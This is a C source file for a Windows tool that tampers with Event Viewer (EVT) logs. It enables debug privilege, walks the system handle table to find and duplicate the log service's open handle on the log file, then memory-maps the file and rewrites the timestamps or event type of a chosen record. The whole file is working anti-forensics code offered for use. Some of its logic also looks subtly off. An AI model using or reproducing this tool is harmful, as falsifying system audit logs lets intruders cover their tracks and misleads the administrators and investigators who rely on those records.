#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <time.h>
#pragma comment(lib,"Advapi32.lib") 
#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#pragma pack(1)

typedef struct _EVENTLOGHEADER {
	ULONG HeaderSize;
	ULONG Signature;
	ULONG MajorVersion;
	ULONG MinorVersion;
	ULONG StartOffset;
	ULONG EndOffset;
	ULONG CurrentRecordNumber;
	ULONG OldestRecordNumber;
	ULONG MaxSize;
	ULONG Flags;
	ULONG Retention;
	ULONG EndHeaderSize;
} EVENTLOGHEADER, *PEVENTLOGHEADER;

typedef struct _EVTLOGRECORD {
	DWORD Length;
	DWORD Reserved;
	DWORD RecordNumber;
	DWORD TimeGenerated;
	DWORD TimeWritten;
	DWORD EventID;
	WORD  EventType;
	WORD  NumStrings;
	WORD  EventCategory;
	WORD  ReservedFlags;
	DWORD ClosingRecordNumber;
	DWORD StringOffset;
	DWORD UserSidLength;
	DWORD UserSidOffset;
	DWORD DataLength;
	DWORD DataOffset;
} EVTLOGRECORD, *PEVTLOGRECORD;

typedef struct _EVENTLOGEOF {
	ULONG RecordSizeBeginning;
	ULONG One;
	ULONG Two;
	ULONG Three;
	ULONG Four;
	ULONG BeginRecord;
	ULONG EndRecord;
	ULONG CurrentRecordNumber;
	ULONG OldestRecordNumber;
	ULONG RecordSizeEnd;
} EVENTLOGEOF, *PEVENTLOGEOF;

#pragma pack()

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

const SYSTEM_INFORMATION_CLASS SystemExtendedHandleInformation = (SYSTEM_INFORMATION_CLASS)64;
int Newlen = 0;

#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI *_NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI *_NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;


typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum _POOL_TYPE
{
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, *PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
{
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

void CheckBlockThreadFunc(void* param)
{
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (NtQueryObject != NULL)
	{
		PVOID objectNameInfo = NULL;
		ULONG returnLength;
		objectNameInfo = malloc(0x1000);
		NtQueryObject((HANDLE)param, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
	}
}

BOOL IsBlockingHandle(HANDLE handle)
{
	HANDLE hThread = (HANDLE)_beginthread(CheckBlockThreadFunc, 0, (void*)handle);
	if (WaitForSingleObject(hThread, 100) != WAIT_TIMEOUT) {
		return FALSE;
	}
	TerminateThread(hThread, 0);
	return TRUE;
}

time_t StringToDatetime(char *str)
{
	tm tm_;
	int year, month, day, hour, minute, second;
	sscanf_s(str, "%d-%d-%d %d:%d:%d", &year, &month, &day, &hour, &minute, &second);
	tm_.tm_year = year - 1900;
	tm_.tm_mon = month - 1;
	tm_.tm_mday = day;
	tm_.tm_hour = hour - 1;
	tm_.tm_min = minute;
	tm_.tm_sec = second;
	tm_.tm_isdst = 0;
	time_t t_ = mktime(&tm_);
	return t_;
}

PVOID ModifyRecord(PVOID mapAddress, int len, char *RecordNumberStr, char *RecordType, char *NewString)
{
	printf("[*]Try to modify the record\n");
	DWORD RecordNumber = 0;
	sscanf_s(RecordNumberStr, "%d", &RecordNumber);
	printf("[+]RecordNumber:%d\n", RecordNumber);
	printf("[+]RecordType:%s\n", RecordType);
	DWORD NewStringNumber = 0;
	sscanf_s(NewString, "%d", &NewStringNumber);
	printf("[+]NewString:%s\n", NewString);

	PEVENTLOGHEADER evtFilePtr = (PEVENTLOGHEADER)mapAddress;
	PEVTLOGRECORD prevRecordPtr = NULL;
	PEVTLOGRECORD currentRecordPtr = (PEVTLOGRECORD)((PBYTE)evtFilePtr + 0x30);
	PEVTLOGRECORD nextRecordPtr = (PEVTLOGRECORD)((PBYTE)currentRecordPtr + currentRecordPtr->Length);

	while (currentRecordPtr->TimeGenerated != 0x33333333)
	{
		if (currentRecordPtr->RecordNumber == RecordNumber)
		{	
			if (memcmp(RecordType, "TimeGenerated", strlen(RecordType)) == 0)
			{
				time_t TimeNum = StringToDatetime(NewString);
				currentRecordPtr->TimeGenerated = TimeNum;
			}
			else if (memcmp(RecordType, "TimeWritten", strlen(RecordType)) == 0)
			{
				time_t TimeNum = StringToDatetime(NewString);
				currentRecordPtr->TimeWritten = TimeNum;
			}
			else if (memcmp(RecordType, "EventType", strlen(RecordType)) == 0)
			{
				currentRecordPtr->EventType = NewStringNumber;
			}
			else
			{
				printf("[!]NewString is wrong");
			}
		}
		prevRecordPtr = currentRecordPtr;
		currentRecordPtr = nextRecordPtr;
		nextRecordPtr = (PEVTLOGRECORD)((PBYTE)nextRecordPtr + nextRecordPtr->Length);
	}

	PEVENTLOGEOF evtEOFPtr = (PEVENTLOGEOF)((PBYTE)currentRecordPtr);

	return mapAddress;
}

BOOL ModifyRecordMain(HANDLE fileHandle, char *RecordNumber, char *RecordType, char *NewString)
{
	HANDLE mapHandle = NULL;
	PVOID mapAddress = NULL;
	mapHandle = CreateFileMapping(fileHandle, NULL, PAGE_READWRITE, 0, 0, NULL);
	if (!mapHandle)
	{
		printf("[!]CreateFileMapping error\n");
		return 0;
	}
	mapAddress = MapViewOfFile(mapHandle, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (!mapAddress)
	{
		printf("[!]MapViewOfFile error\n");
		return 0;
	}
	int len = GetFileSize(fileHandle, NULL);
	printf("[+]File size:%d\n", len);

	mapAddress = ModifyRecord(mapAddress, len, RecordNumber, RecordType, NewString);

	FlushViewOfFile(mapAddress, 0);
	if (mapAddress)
		UnmapViewOfFile(mapAddress);
	if (mapHandle)
		CloseHandle(mapHandle);

	return 1;
}

int main(int argc, char *argv[])
{
	if (argc != 5)
	{	
		printf("\nModify the selected records of the Windows Event Viewer Log (EVT) files\n");
		printf("Support:WinXP and later\n");
		printf("Usage:\n");
		printf("     %s <absolute or relative file path> <RecordNumber> <RecordType> <NewString>\n", argv[0]);
		printf("eg:\n");
		printf("     %s sysevent.evt 1 TimeGenerated \"2018-7-01 01:01:01\"\n", argv[0]);
		printf("     %s sysevent.evt 3 EventType 8\n", argv[0]);
		printf("[!]Wrong parameter\n");
		return 0;
	}

	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION_EX handleInfo;
	ULONG handleInfoSize = 0x10000;
	HANDLE processHandle = NULL;
	ULONG i;
	DWORD ErrorPID = 0;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = { 0 };
	wchar_t buf1[100];
	swprintf(buf1, 100, L"%hs", argv[1]);
	_wcslwr_s(buf1, wcslen(buf1) + 1);

	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
	}

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
	{
		printf("[!]Could not find NtQuerySystemInformation entry point in NTDLL.DLL");
		return 0;
	}
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtDuplicateObject");
	if (!NtDuplicateObject)
	{
		printf("[!]Could not find NtDuplicateObject entry point in NTDLL.DLL");
		return 0;
	}
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (!NtQueryObject)
	{
		printf("[!]Could not find NtQueryObject entry point in NTDLL.DLL");
		return 0;
	}

	handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("[!]NtQuerySystemInformation failed!\n");
		return 0;
	}

	UNICODE_STRING objectName;
	ULONG returnLength;
	for (i = 0; i < handleInfo->NumberOfHandles; i++)
	{
		handle = &handleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
		PVOID objectNameInfo = NULL;

		if (handle->ObjectTypeIndex == 0x1c)//select File Type
		{
			if (handle->UniqueProcessId == (HANDLE)ErrorPID)
			{
				free(objectTypeInfo);
				free(objectNameInfo);
				CloseHandle(dupHandle);
				continue;
			}

			if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)handle->UniqueProcessId)))
			{
				printf("[!]Could not open PID %d!\n", handle->UniqueProcessId);
				ErrorPID = (DWORD)handle->UniqueProcessId;
				free(objectTypeInfo);
				free(objectNameInfo);
				CloseHandle(dupHandle);
				CloseHandle(processHandle);
				continue;
			}


			if (!NT_SUCCESS(NtDuplicateObject(processHandle, handle->HandleValue, GetCurrentProcess(), &dupHandle, 0, 0, 0)))
			{
				//			printf("[%#x] Error!\n", handle.Handle);
				free(objectTypeInfo);
				free(objectNameInfo);
				CloseHandle(dupHandle);
				CloseHandle(processHandle);
				continue;
			}
			objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
			if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
			{
				//			printf("[%#x] Error!\n", handle.Handle);
				free(objectTypeInfo);
				free(objectNameInfo);
				CloseHandle(dupHandle);
				CloseHandle(processHandle);
				continue;
			}
			objectNameInfo = malloc(0x1000);

			if (IsBlockingHandle(dupHandle) == TRUE) //filter out the object which NtQueryObject could hang on
			{
				free(objectTypeInfo);
				free(objectNameInfo);
				CloseHandle(dupHandle);
				CloseHandle(processHandle);
				continue;
			}

			if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength)))
			{

				objectNameInfo = realloc(objectNameInfo, returnLength);
				if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectNameInformation, objectNameInfo, returnLength, NULL)))
				{
					//				printf("[%#x] %.*S: (could not get name)\n", handle.Handle, objectTypeInfo->Name.Length / 2, objectTypeInfo->Name.Buffer);
					free(objectTypeInfo);
					free(objectNameInfo);
					CloseHandle(dupHandle);
					CloseHandle(processHandle);
					continue;
				}
			}
			objectName = *(PUNICODE_STRING)objectNameInfo;
			if (objectName.Length)
			{
				_wcslwr_s(objectName.Buffer, wcslen(objectName.Buffer) + 1);
				if (wcsstr(objectName.Buffer, buf1) != 0)
				{
					printf("[+]HandleName:%.*S\n", objectName.Length / 2, objectName.Buffer);
					printf("[+]Pid:%d\n", handle->UniqueProcessId);
					printf("[+]Handle:%#x\n", handle->HandleValue);
					printf("[+]Type:%#x\n", handle->ObjectTypeIndex);
					printf("[+]ObjectAddress:0x%p\n", handle->Object);
					printf("[+]GrantedAccess:%#x\n", handle->GrantedAccess);

					if (memcmp(argv[2], "1", 1) == 0)
					{
						if (DuplicateHandle(processHandle, handle->HandleValue, GetCurrentProcess(), &dupHandle, 0, 0, DUPLICATE_SAME_ACCESS))
						{

							ModifyRecordMain(dupHandle, argv[2], argv[3], argv[4]);
							//exit,but don't close the handle of dupHandle
							free(objectTypeInfo);
							free(objectNameInfo);
							CloseHandle(processHandle);
							break;
						}
						else
							printf("[!]DuplicateHandle error\n");
					}
				}
			}
			else
			{
				//			printf("[%#x] %.*S: (unnamed)\n",handle.Handle,objectTypeInfo->Name.Length / 2,objectTypeInfo->Name.Buffer);
			}
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
		}
	}
	free(handleInfo);
	return 0;
}